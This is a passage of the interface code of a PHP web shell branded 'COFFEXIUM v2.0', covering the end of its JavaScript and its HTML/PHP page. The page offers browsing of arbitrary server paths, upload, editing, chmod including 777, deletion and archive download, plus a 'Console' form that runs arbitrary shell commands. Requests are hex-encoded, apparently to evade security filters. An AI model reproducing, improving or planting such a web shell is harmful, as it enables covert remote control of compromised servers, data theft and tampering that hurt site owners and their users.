                action: type === 'file' ? 'create_file' : 'create_folder',
                name_hex: stringToHex(name)
            });
        }

        function doSaveEditHex(event) {
            event.preventDefault();
            const fileName = event.target.elements['edit_file'].value;
            const content = event.target.elements['content'].value;
            sendHexPayload({
                action: 'edit_file',
                file_hex: stringToHex(fileName),
                content_hex: stringToHex(content)
            });
        }

        function doRenameHex(event) {
            event.preventDefault();
            const oldName = event.target.elements['from_name'].value;
            const newName = event.target.elements['to_name'].value.trim();
            if (!newName || newName === oldName) { location.reload(); return; }
            sendHexPayload({
                action: 'rename',
                old_hex: stringToHex(oldName),
                new_hex: stringToHex(newName)
            });
        }

        function doChmodHex(event) {
            event.preventDefault();
            const itemName = document.getElementById('chmodItem').value;
            const permVal = document.getElementById('chmodOctal').value;
            sendHexPayload({
                action: 'chmod',
                item_hex: stringToHex(itemName),
                perm_val: permVal
            });
        }

        function doDeleteHex(itemName) {
            if (!confirm(`Delete ${itemName}?`)) return;
            sendHexPayload({
                action: 'delete',
                item_hex: stringToHex(itemName)
            });
        }

        function doBulkDeleteHex(event) {
            event.preventDefault();
            if (!confirm('Delete all selected items?')) return;
            const checked = document.querySelectorAll('input[name="items[]"]:checked');
            const items = Array.from(checked).map(cb => stringToHex(cb.value));
            sendHexPayload({
                action: 'bulk_delete',
                items: items
            });
        }

        function toggleSelectAll(cb) {
            document.querySelectorAll('input[name="items[]"]').forEach(function(c){ c.checked = cb.checked; });
            updateBulkActions();
        }
        function updateBulkActions() {
            var checked = document.querySelectorAll('input[name="items[]"]:checked');
            var bar = document.getElementById('bulk-actions');
            var count = document.getElementById('selected-count');
            if (checked.length > 0) { bar.style.display = 'flex'; count.textContent = checked.length + ' item(s) selected'; }
            else { bar.style.display = 'none'; }
        }
        function openChmodModal(itemName, octalId) {
            var modal = document.getElementById('chmodModal');
            modal.classList.add('show'); modal.style.display = 'flex';
            document.getElementById('chmodItem').value = itemName;
            updateChmodDisplay(document.getElementById(octalId).value);
        }
        function closeChmodModal() {
            var modal = document.getElementById('chmodModal');
            modal.classList.remove('show'); modal.style.display = 'none';
        }
        function updateChmodDisplay(perms) {
            perms = (perms || '0').toString().slice(-3);
            document.getElementById('chmodOctal').value = perms;
            var binary = (parseInt(perms, 8) || 0).toString(2);
            while (binary.length < 9) { binary = '0' + binary; }
            var ids = ['owner_read','owner_write','owner_execute','group_read','group_write','group_execute','other_read','other_write','other_execute'];
            for (var i = 0; i < 9; i++) { document.getElementById(ids[i]).checked = binary[i] === '1'; }
        }
        function updateChmodFromCheckboxes() {
            var ids = ['owner_read','owner_write','owner_execute','group_read','group_write','group_execute','other_read','other_write','other_execute'];
            var binary = '';
            for (var i = 0; i < 9; i++) { binary += document.getElementById(ids[i]).checked ? '1' : '0'; }
            var octal = parseInt(binary, 2).toString(8);
            while (octal.length < 3) { octal = '0' + octal; }
            document.getElementById('chmodOctal').value = octal;
        }
        function setPresetChmod(p) { updateChmodDisplay(p); }
        window.onclick = function(e) {
            var modal = document.getElementById('chmodModal');
            if (e.target == modal) { closeChmodModal(); }
        };
        document.addEventListener('DOMContentLoaded', function() {
            var token = getCsrfToken();
            document.querySelectorAll('form[method="post"]').forEach(function(form) {
                if (!form.querySelector('input[name="_csrf_token"]')) {
                    var i = document.createElement('input');
                    i.type = 'hidden'; i.name = '_csrf_token'; i.value = token;
                    form.appendChild(i);
                }
            });
        });
    </script>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="header-top">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>
                </svg>
                <span class="logo-text">COFF<span>EXIUM</span> v2.0</span>
            </div>
        </div>
    </div>

    <?php if ($notification): ?>
        <div class="alert alert-success">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
            <?= htmlentities($notification) ?>
        </div>
    <?php endif; ?>
    <?php if ($errorMsg): ?>
        <div class="alert alert-danger">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
            <?= htmlentities($errorMsg) ?>
        </div>
    <?php endif; ?>

    <!-- Navigation -->
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                Navigate
            </span>
        </div>
        <div class="card-body">
            <form method="post" class="input-group">
                <?= csrfField() ?>
                <input type="text" name="goto" value="<?= htmlentities($currentDirectory) ?>" placeholder="Enter path..." style="flex: 1;">
                <button class="btn btn-primary" type="submit">Go</button>
            </form>
        </div>
    </div>

    <!-- Upload & Create -->
    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px;">
        <div class="card">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                    Hex Payload Upload
                </span>
            </div>
            <div class="card-body">
                <div class="input-group">
                    <input type="file" id="upload_files">
                    <button class="btn btn-primary" onclick="doUploadFileHex(this)">Upload</button>
                </div>
                <p style="margin-top: 8px; font-size: 12px; color: var(--text-muted);">Status: <span id="upload_status">No file selected</span></p>
            </div>
        </div>

        <div class="card">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14M5 12h14"/></svg>
                    Create New
                </span>
            </div>
            <div class="card-body">
                <form onsubmit="doCreateItemHex(event, 'file')" class="input-group">
                    <input type="text" name="mk_file" placeholder="New file name..." style="flex: 1;">
                    <button class="btn btn-success" type="submit">File</button>
                </form>
                <form onsubmit="doCreateItemHex(event, 'folder')" class="input-group">
                    <input type="text" name="mk_folder" placeholder="New folder name..." style="flex: 1;">
                    <button class="btn btn-success" type="submit">Folder</button>
                </form>
            </div>
        </div>
    </div>

    <!-- Viewer -->
    <?php if ($fileToView && $viewContent !== null): ?>
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                Viewing: <?= htmlentities($fileToView) ?>
            </span>
            <button type="button" class="btn btn-ghost btn-sm" onclick="location.href=location.pathname;">Close</button>
        </div>
        <div class="card-body">
            <textarea readonly style="min-height: 300px; width: 100%; box-sizing: border-box;"><?= htmlentities($viewContent) ?></textarea>
        </div>
    </div>
    <?php endif; ?>

    <!-- Editor -->
    <?php if ($fileToEdit !== null): ?>
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                Editing: <?= htmlentities($fileToEdit) ?>
            </span>
        </div>
        <div class="card-body">
            <form onsubmit="doSaveEditHex(event)">
                <input type="hidden" name="edit_file" value="<?= htmlentities($fileToEdit) ?>">
                <textarea name="content" style="min-height: 400px; width: 100%; box-sizing: border-box;"><?= htmlentities($fileContent) ?></textarea>
                <div style="margin-top: 12px; display: flex; gap: 8px;">
                    <button class="btn btn-primary" type="submit">Save Changes</button>
                    <button type="button" class="btn btn-ghost" onclick="location.href=location.pathname;">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <!-- Console -->
    <?php if ($commandAvailable): ?>
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
                Console
            </span>
        </div>
        <div class="card-body">
            <form method="post" class="input-group" style="flex: 1;">
                <?= csrfField() ?>
                <input type="text" name="exec" placeholder="Enter command..." style="flex: 1;">
                <button class="btn btn-success" type="submit">Execute</button>
            </form>
            <?php if ($commandResult): ?>
                <div class="console" style="margin-top: 12px;"><?= htmlentities($commandResult) ?></div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <!-- Bulk Actions -->
    <form method="post" id="file-form">
        <?= csrfField() ?>
        <div class="bulk-bar" id="bulk-actions">
            <span class="bulk-count" id="selected-count">0 selected</span>
            <button type="submit" name="act_dl" class="btn btn-ghost" onclick="return confirm('Download selected items as archive?')">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                Download Archive
            </button>
            <button type="button" class="btn btn-danger" onclick="doBulkDeleteHex(event)">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                Delete Selected
            </button>
        </div>
    </form>

    <!-- File Explorer -->
    <div class="card">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                Files
            </span>
            <form method="post" style="display:inline;">
                <?= csrfField() ?>
                <input type="hidden" name="goto" value="<?= htmlentities(dirname($currentDirectory)) ?>">
                <button type="submit" class="btn btn-ghost"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Parent</button>
            </form>
        </div>
        <table class="file-table">
            <thead>
                <tr>
                    <th style="width: 40px;"><input type="checkbox" onclick="toggleSelectAll(this)"></th>
                    <th>Name</th>
                    <th style="width: 100px;">Type</th>
                    <th style="width: 100px; text-align: right;">Size</th>
                    <th style="width: 150px;">Modified</th>
                    <th style="width: 90px; text-align: center;">Perms</th>
                    <th style="width: 230px; text-align: right;">Actions</th>
                </tr>
            </thead>
            <tbody>
        <?php foreach ($allItems as $item):
            $fullPath = $currentDirectory . DIRECTORY_SEPARATOR . $item;
            $realPath = validatePath($fullPath);
            if ($realPath !== false) {
                $isDirectory = @is_dir($realPath);
                $canWrite = @is_writable($realPath);
                $fileSize = $isDirectory ? 0 : @filesize($realPath);
                $fileModTime = @filemtime($realPath);
                $filePerms = @substr(sprintf('%o', @fileperms($realPath)), -4);
            } else {
                $isDirectory = @is_dir($fullPath);
                $canWrite = false; $fileSize = 0; $fileModTime = 0; $filePerms = '????';
            }
            $md5item = md5($item);
            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
            $iconClass = $isDirectory ? 'folder' : 'file';
            $iconHtml = $isDirectory
                ? '<svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>'
                : '<svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
            if (!$isDirectory && $ext) { $iconHtml .= '<span class="ext">' . strtoupper($ext) . '</span>'; }
        ?>
            <tr>
                <td><input type="checkbox" name="items[]" form="file-form" value="<?= htmlentities($item) ?>" onclick="updateBulkActions()"></td>
                <td>
                    <?php if ($itemToRename === $item): ?>
                        <form onsubmit="doRenameHex(event)" style="margin: 0; display: flex; gap: 8px; align-items: center;">
                            <input type="hidden" name="from_name" value="<?= htmlentities($item) ?>">
                            <input type="text" name="to_name" value="<?= htmlentities($item) ?>">
                            <button class="btn btn-primary btn-sm" type="submit">Save</button>
                            <button type="button" class="btn btn-ghost btn-sm" onclick="location.href=location.pathname;">Cancel</button>
                        </form>
                    <?php else: ?>
                        <div class="file-name-cell">
                            <div class="file-icon <?= $iconClass ?>"><?= $iconHtml ?></div>
                            <?php if ($isDirectory): ?>
                                <a href="#" class="file-name" onclick="document.getElementById('nav-<?= $md5item ?>').submit(); return false;"><?= htmlentities($item) ?></a>
                                <form id="nav-<?= $md5item ?>" method="post" style="display: none;">
                                    <?= csrfField() ?>
                                    <input type="hidden" name="goto" value="<?= htmlentities($fullPath) ?>">
                                </form>
                            <?php else: ?>
                                <a href="#" class="file-name" onclick="document.getElementById('view-<?= $md5item ?>').submit(); return false;"><?= htmlentities($item) ?></a>
                                <form id="view-<?= $md5item ?>" method="post" style="display: none;">
                                    <?= csrfField() ?>
                                    <input type="hidden" name="show" value="<?= htmlentities($item) ?>">
                                </form>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>
                </td>
                <td><span class="file-meta"><?= $isDirectory ? 'Directory' : (getFileExtension($item) ?: 'File') ?></span></td>
                <td style="text-align: right;"><span class="file-meta"><?= $isDirectory ? '&mdash;' : formatFileSize($fileSize) ?></span></td>
                <td><span class="file-meta"><?= date('Y-m-d H:i', $fileModTime) ?></span></td>
                <td style="text-align: center;">
                    <span class="perms <?= $canWrite ? 'writable' : 'readonly' ?>"><?= htmlentities($filePerms) ?></span>
                    <input type="hidden" id="currentPerms_<?= $md5item ?>" value="<?= htmlentities($filePerms) ?>">
                </td>
                <td>
                    <div class="actions">
                        <?php if (!$isDirectory): ?>
                            <form method="post" style="display: inline;">
                                <?= csrfField() ?>
                                <input type="hidden" name="modify" value="<?= htmlentities($item) ?>">
                                <button type="submit" class="btn btn-ghost btn-sm">Edit</button>
                            </form>
                        <?php endif; ?>
                        <form method="post" style="display: inline;">
                            <?= csrfField() ?>
                            <input type="hidden" name="rename_item" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-ghost btn-sm">Rename</button>
                        </form>
                        <button type="button" class="btn btn-ghost btn-sm" onclick="openChmodModal('<?= htmlentities($item) ?>', 'currentPerms_<?= $md5item ?>')">Chmod</button>
                        <form method="post" style="display: inline;">
                            <?= csrfField() ?>
                            <input type="hidden" name="get_file" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-ghost btn-sm">DL</button>
                        </form>
                        <button type="button" class="btn btn-danger btn-sm" onclick="doDeleteHex('<?= addslashes($item) ?>')">Del</button>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<div id="chmodModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <span class="modal-title">Change Permissions</span>
            <span class="modal-close" onclick="closeChmodModal()">&times;</span>
        </div>
        <form onsubmit="doChmodHex(event)">
            <input type="hidden" id="chmodItem" value="">
            <div class="chmod-grid">
                <div class="chmod-group">
                    <div class="chmod-group-label">Owner</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="owner_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="owner_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="owner_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
                <div class="chmod-group">
                    <div class="chmod-group-label">Group</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="group_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="group_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="group_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
                <div class="chmod-group">
                    <div class="chmod-group-label">Other</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="other_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="other_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="other_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
            </div>
            <div class="modal-body">
                <div style="margin-bottom: 16px; text-align: center;">
                    <input type="text" id="chmodOctal" maxlength="3" style="width: 70px; text-align: center; font-family: 'JetBrains Mono', monospace;">
                </div>
                <div style="margin-bottom: 15px; display: flex; gap: 8px; flex-wrap: wrap;">
                    <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('755')">755 (Default)</button>
                    <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('644')">644 (File)</button>
                    <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('777')">777 (All)</button>
                </div>
                <div style="display: flex; gap: 8px;">
                    <button type="submit" class="btn btn-primary">Apply Changes</button>
                    <button type="button" class="btn btn-ghost" onclick="closeChmodModal()">Cancel</button>
                </div>
            </div>
        </form>
    </div>
</div>
</body>
</html>
